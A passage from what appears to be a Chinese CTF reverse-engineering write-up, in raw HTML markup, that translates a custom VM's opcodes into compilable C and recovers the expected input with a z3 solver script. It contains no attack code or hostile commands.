class="hljs-number">1</span><br>opcode[<span class="hljs-number">88</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">89</span>] = <span class="hljs-number">24</span><br>opcode[<span class="hljs-number">90</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">91</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">92</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">93</span>] = <span class="hljs-number">12</span><br>opcode[<span class="hljs-number">94</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">95</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">96</span>] = <span class="hljs-number">13</span><br>opcode[<span class="hljs-number">97</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">98</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">99</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">100</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">101</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">102</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">103</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">104</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">105</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">106</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">107</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">108</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">109</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">110</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">111</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">112</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">113</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">114</span>] = <span class="hljs-number">9</span><br>opcode[<span class="hljs-number">115</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">116</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">117</span>] = <span class="hljs-number">11</span><br>opcode[<span class="hljs-number">118</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">119</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">120</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">121</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">122</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">123</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">124</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">125</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">126</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">127</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">128</span>] = <span class="hljs-number">50</span><br>opcode[<span class="hljs-number">129</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">130</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">131</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">132</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">133</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">134</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">135</span>] = <span class="hljs-number">9</span><br>opcode[<span class="hljs-number">136</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">137</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">138</span>] = <span class="hljs-number">11</span><br>opcode[<span class="hljs-number">139</span>] = <span class="hljs-number">159</span><br>opcode[<span class="hljs-number">140</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">141</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">142</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">143</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">144</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">145</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">146</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">147</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">148</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">149</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">150</span>] = <span class="hljs-number">9</span><br>opcode[<span class="hljs-number">151</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">152</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">153</span>] = <span class="hljs-number">11</span><br>opcode[<span class="hljs-number">154</span>] = <span class="hljs-number">126</span><br>opcode[<span class="hljs-number">155</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">156</span>] = <span class="hljs-number">0xE</span><br>opcode[<span class="hljs-number">157</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">158</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">159</span>] = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(opcode),<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] = <span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>;&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] + 10] = des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] = des[des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>]+10];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] ^= des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] += des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">6</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] = des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] - des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] &amp;= des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] |= des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">9</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d = des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] == des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>];&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;if(d == 1) goto label_<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>;&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">11</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;if(d == 0) goto label_<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>;&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">12</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] &lt;&lt;= des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>] &amp; 0x1f;&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">13</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">1</span>]&#125;</span>] &gt;&gt;= des[<span class="hljs-subst">&#123;opcode[i+<span class="hljs-number">2</span>]&#125;</span>] &amp; 0x1f;&quot;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">14</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;printf(&quot;success&quot;);&#x27;</span>)<br>    <span class="hljs-keyword">if</span> opcode[i] == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;label_%d:&quot;</span> %(i))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;printf(&quot;wrong&quot;);&#x27;</span>)<br>    <br></code></pre></td></tr></table></figure><p>我们通过添加<code>label_X:</code>可以让我们转换出来的代码交给<code>VS</code>等编译器进行编译，进而方便我们观察<code>VM</code>程序的执行过程，同时也节约了一部分翻译转换为代码的时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// easy_mix.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">bool</span> d;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> des[<span class="hljs-number">100</span>] = &#123;<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x556B4A7A</span>, <span class="hljs-number">0xD043F107</span>, <span class="hljs-number">0x3DD67E0E</span>, <span class="hljs-number">0xB065623F</span>, <span class="hljs-number">0x32870017</span>, <span class="hljs-number">0xACDA02A2</span>,<br><span class="hljs-number">0xD185BCEE</span>, <span class="hljs-number">0x015DA6EF</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x215432AD</span>, <span class="hljs-number">0xC0848707</span>, <span class="hljs-number">0xD35AEA02</span>, <span class="hljs-number">0xB6707A11</span>,<br><span class="hljs-number">0xAD521CB0</span>, <span class="hljs-number">0x40DFFB26</span>, <span class="hljs-number">0xC59D8EE9</span>, <span class="hljs-number">0x7FF69654</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>,<br><span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span><br>&#125;;<br>label_0:<br>des[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>label_3:<br>des[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>label_6:<br>des[<span class="hljs-number">2</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_9:<br>des[<span class="hljs-number">3</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_12:<br>des[<span class="hljs-number">4</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_15:<br>des[<span class="hljs-number">5</span>] = <span class="hljs-number">2</span>;<br>label_18:<br>des[<span class="hljs-number">6</span>] = <span class="hljs-number">30</span>;<br>label_21:<br>des[<span class="hljs-number">3</span>] &lt;&lt;= des[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_24:<br>des[<span class="hljs-number">4</span>] &gt;&gt;= des[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_27:<br>des[<span class="hljs-number">3</span>] |= des[<span class="hljs-number">4</span>];<br>label_30:<br>des[<span class="hljs-number">2</span>] ^= des[<span class="hljs-number">3</span>];<br>label_33:<br>des[<span class="hljs-number">3</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_36:<br>des[<span class="hljs-number">4</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_39:<br>des[<span class="hljs-number">5</span>] = <span class="hljs-number">10</span>;<br>label_42:<br>des[<span class="hljs-number">6</span>] = <span class="hljs-number">22</span>;<br>label_45:<br>des[<span class="hljs-number">3</span>] &lt;&lt;= des[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_48:<br>des[<span class="hljs-number">4</span>] &gt;&gt;= des[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_51:<br>des[<span class="hljs-number">3</span>] |= des[<span class="hljs-number">4</span>];<br>label_54:<br>des[<span class="hljs-number">2</span>] ^= des[<span class="hljs-number">3</span>];<br>label_57:<br>des[<span class="hljs-number">3</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_60:<br>des[<span class="hljs-number">4</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_63:<br>des[<span class="hljs-number">5</span>] = <span class="hljs-number">18</span>;<br>label_66:<br>des[<span class="hljs-number">6</span>] = <span class="hljs-number">14</span>;<br>label_69:<br>des[<span class="hljs-number">3</span>] &lt;&lt;= des[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_72:<br>des[<span class="hljs-number">4</span>] &gt;&gt;= des[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_75:<br>des[<span class="hljs-number">3</span>] |= des[<span class="hljs-number">4</span>];<br>label_78:<br>des[<span class="hljs-number">2</span>] ^= des[<span class="hljs-number">3</span>];<br>label_81:<br>des[<span class="hljs-number">3</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_84:<br>des[<span class="hljs-number">4</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_87:<br>des[<span class="hljs-number">5</span>] = <span class="hljs-number">24</span>;<br>label_90:<br>des[<span class="hljs-number">6</span>] = <span class="hljs-number">8</span>;<br>label_93:<br>des[<span class="hljs-number">3</span>] &lt;&lt;= des[<span class="hljs-number">5</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_96:<br>des[<span class="hljs-number">4</span>] &gt;&gt;= des[<span class="hljs-number">6</span>] &amp; <span class="hljs-number">0x1f</span>;<br>label_99:<br>des[<span class="hljs-number">3</span>] |= des[<span class="hljs-number">4</span>];<br>label_102:<br>des[<span class="hljs-number">2</span>] ^= des[<span class="hljs-number">3</span>];<br>label_105:<br>des[des[<span class="hljs-number">0</span>] + <span class="hljs-number">10</span>] = des[<span class="hljs-number">2</span>];<br>label_108:<br>des[<span class="hljs-number">0</span>] += des[<span class="hljs-number">1</span>];<br>label_111:<br>des[<span class="hljs-number">3</span>] = <span class="hljs-number">8</span>;<br>label_114:<br>d = des[<span class="hljs-number">0</span>] == des[<span class="hljs-number">3</span>];<br>label_117:<br><span class="hljs-keyword">if</span> (d == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> label_3;<br>label_120 :<br>des[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>label_123:<br>des[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>label_126:<br>des[<span class="hljs-number">2</span>] = <span class="hljs-number">50</span>;<br>label_129:<br>des[<span class="hljs-number">3</span>] = des[<span class="hljs-number">0</span> + <span class="hljs-number">10</span>];<br>label_132:<br>des[<span class="hljs-number">4</span>] = des[<span class="hljs-number">2</span> + <span class="hljs-number">10</span>];<br>label_135:<br>d = des[<span class="hljs-number">3</span>] == des[<span class="hljs-number">4</span>];<br>label_138:<br><span class="hljs-keyword">if</span> (d == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> label_159;<br>label_141 :<br>des[<span class="hljs-number">0</span>] += des[<span class="hljs-number">1</span>];<br>label_144:<br>des[<span class="hljs-number">2</span>] += des[<span class="hljs-number">1</span>];<br>label_147:<br>des[<span class="hljs-number">3</span>] = <span class="hljs-number">8</span>;<br>label_150:<br>d = des[<span class="hljs-number">0</span>] == des[<span class="hljs-number">3</span>];<br>label_153:<br><span class="hljs-keyword">if</span> (d == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> label_126;<br>label_156:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>label_159:<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong!&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>进行转换后我们可以写出对应的加密过程，可以看到是一个<code>SM4</code>加密的一部分，用其来进行判断我们<code>XTEA</code>加密后的数据，对此我们可以利用<code>z3</code>进行约束求解：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s = Solver()<br>des = [BitVec(<span class="hljs-string">f&#x27;des[<span class="hljs-subst">&#123;i&#125;</span>]&#x27;</span>,<span class="hljs-number">64</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>enc = [<span class="hljs-number">0</span>]*<span class="hljs-number">8</span><br>enc[<span class="hljs-number">0</span>] = <span class="hljs-number">0x215432AD</span><br>enc[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC0848707</span><br>enc[<span class="hljs-number">2</span>] = <span class="hljs-number">0xD35AEA02</span><br>enc[<span class="hljs-number">3</span>] = <span class="hljs-number">0xB6707A11</span><br>enc[<span class="hljs-number">4</span>] = <span class="hljs-number">0xAD521CB0</span><br>enc[<span class="hljs-number">5</span>] = <span class="hljs-number">0x40DFFB26</span><br>enc[<span class="hljs-number">6</span>] = <span class="hljs-number">0xC59D8EE9</span><br>enc[<span class="hljs-number">7</span>] = <span class="hljs-number">0x7FF69654</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    x = des[i]<br>    des[i] ^= (x &lt;&lt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xffffffff</span> | (x &gt;&gt; <span class="hljs-number">30</span>)<br>    des[i] ^= (x &lt;&lt; <span class="hljs-number">10</span>) &amp; <span class="hljs-number">0xffffffff</span> | (x &gt;&gt; <span class="hljs-number">22</span>)<br>    des[i] ^= (x &lt;&lt; <span class="hljs-number">18</span>) &amp; <span class="hljs-number">0xffffffff</span> | (x &gt;&gt; <span class="hljs-number">14</span>)<br>    des[i] ^= (x &lt;&lt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xffffffff</span> | (x &gt;&gt; <span class="hljs-number">8</span>)<br>    s.add(des[i] == enc[i])<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    model = s.model()<br>    res = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(model)):<br>        <span class="hljs-keyword">for</span> decls <span class="hljs-keyword">in</span> model:<br>            <span class="hljs-keyword">if</span> decls.name() == (<span class="hljs-string">&#x27;des[%d]&#x27;</span> % j):<br>                res.append(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;%s&#x27;</span> % model[decls]))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):            <br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(res[i]),end=<span class="hljs-string">&#x27;,&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span 